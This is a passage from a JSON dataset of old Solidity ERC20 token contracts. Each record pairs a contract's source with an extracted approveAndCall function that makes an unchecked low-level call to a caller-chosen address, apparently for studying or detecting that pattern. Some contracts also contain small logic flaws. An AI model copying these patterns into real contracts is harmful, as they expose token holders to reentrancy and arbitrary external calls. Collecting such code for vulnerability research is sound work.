    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb154d"
  },
  "filename": "34287.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract UselessEthTokenLite is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function UselessEthTokenLite(\n ) {\n balances[msg.sender] = 800000000000000;\n totalSupply = 800000000000000;\n name = \"UselessEthTokenLite\";\n decimals = 8;\n symbol = \"UETL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb154e"
  },
  "filename": "34300.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SunQuid is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.0';\n function SunQuid(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"SunQuid\";\n decimals = 0;\n symbol = \"SQD\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb154f"
  },
  "filename": "34312.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract TKCToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function TKCToken() {\n balances[msg.sender] = 280000000000000;\n totalSupply = 280000000000000;\n name = \"TKC\";\n decimals = 6;\n symbol = \"TKC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1550"
  },
  "filename": "34315.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000;\n totalSupply = 100000;\n name = \"Scamcoin\";\n decimals = 2;\n symbol = \"SCAM\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1551"
  },
  "filename": "34319.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CoinistCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function CoinistCoin(\n ) {\n balances[msg.sender] = 1000;\n totalSupply = 1000;\n name = \"Jin Chan Coin\";\n decimals = 0;\n symbol = \"CNST\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1552"
  },
  "filename": "34321.sol",
  "content": "pragma solidity ^0.4.13;\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract BountyManager is Ownable {\n using SafeMath for uint256;\n Peculium public pecul;\n bool public initPecul;\n event InitializedToken(address contractToken);\n address public bountymanager ;\n uint256 public bountymanagerShare;\n bool public First_pay_bountymanager;\n uint256 public first_pay;\n uint256 public montly_pay;\n bool public bountyInit;\n uint256 public payday;\n uint256 public nbMonthsPay;\n event InitializedManager(address ManagerAdd);\n event FirstPaySend(uint256 first,address receiver);\n event MonthlyPaySend(uint256 monthPay,address receiverMonthly);\n function BountyManager() {\n bountymanagerShare = SafeMath.mul(72000000,(10**8));\n first_pay = SafeMath.div(SafeMath.mul(40,bountymanagerShare),100);\n montly_pay = SafeMath.div(SafeMath.mul(10,bountymanagerShare),100);\n nbMonthsPay = 0;\n First_pay_bountymanager=true;\n initPecul = false;\n bountyInit==false;\n }\n function InitPeculiumAdress(address peculAdress) onlyOwner\n {\n pecul = Peculium(peculAdress);\n payday = pecul.dateDefrost();\n initPecul = true;\n InitializedToken(peculAdress);\n }\n function change_bounty_manager (address public_key) onlyOwner\n {\n bountymanager = public_key;\n bountyInit=true;\n InitializedManager(public_key);\n }\n function transferManager() onlyOwner Initialize BountyManagerInit\n {\n require(now > payday);\n if(First_pay_bountymanager==false && nbMonthsPay < 6)\n {\n pecul.transfer(bountymanager,montly_pay);\n payday = payday.add( 31 days);\n nbMonthsPay=nbMonthsPay.add(1);\n MonthlyPaySend(montly_pay,bountymanager);\n }\n if(First_pay_bountymanager==true)\n {\n pecul.transfer(bountymanager,first_pay);\n payday = payday.add( 35 days);\n First_pay_bountymanager=false;\n FirstPaySend(first_pay,bountymanager);\n }\n }\n modifier Initialize {\n require (initPecul==true);\n _;\n }\n modifier BountyManagerInit {\n require (bountyInit==true);\n _;\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n uint256 _allowance = allowed[_from][msg.sender];\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = _allowance.sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract BurnableToken is StandardToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n require(_value > 0);\n require(_value <= balances[msg.sender]);\n address burner = msg.sender;\n balances[burner] = balances[burner].sub(_value);\n totalSupply = totalSupply.sub(_value);\n Burn(burner, _value);\n }\n}\ncontract Peculium is BurnableToken,Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n string public name = \"Peculium\";\n string public symbol = \"PCL\";\n uint256 public decimals = 8;\n uint256 public constant MAX_SUPPLY_NBTOKEN = 20000000000*10**8;\n uint256 public dateStartContract;\n mapping(address => bool) public balancesCanSell;\n uint256 public dateDefrost;\n event FrozenFunds(address target, bool frozen);\n event Defroze(address msgAdd, bool freeze);\n function Peculium() {\n totalSupply = MAX_SUPPLY_NBTOKEN;\n balances[owner] = totalSupply;\n balancesCanSell[owner] = true;\n dateStartContract=now;\n dateDefrost = dateStartContract + 85 days;\n }\n function defrostToken() public\n {\n require(now>dateDefrost);\n balancesCanSell[msg.sender]=true;\n Defroze(msg.sender,true);\n }\n function transfer(address _to, uint256 _value) public returns (bool)\n {\n require(balancesCanSell[msg.sender]);\n return BasicToken.transfer(_to,_value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool)\n {\n require(balancesCanSell[msg.sender]);\n return StandardToken.transferFrom(_from,_to,_value);\n }\n function freezeAccount(address target, bool canSell) onlyOwner\n {\n balancesCanSell[target] = canSell;\n FrozenFunds(target, canSell);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function getBlockTimestamp() constant returns (uint256)\n {\n return now;\n }\n function getOwnerInfos() constant returns (address ownerAddr, uint256 ownerBalance)\n {\n ownerAddr = owner;\n ownerBalance = balanceOf(ownerAddr);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1553"
  },
  "filename": "34336.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000;\n totalSupply = 100000000000000;\n name = \"CRYPT0COIN\";\n decimals = 8;\n symbol = \"CRP\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1554"
  },
  "filename": "34344.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract FreelanceToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function FreelanceToken(\n ) {\n balances[msg.sender] = 30000000000000;\n totalSupply = 30000000000000;\n name = \"Freelance Token\";\n decimals = 6;\n symbol = \"FLT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1555"
  },
  "filename": "34350.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 16400000;\n totalSupply = 16400000;\n name = \"Stop Tabac Coin\";\n decimals = 0;\n symbol = \"STCn\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1556"
  },
  "filename": "34351.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n 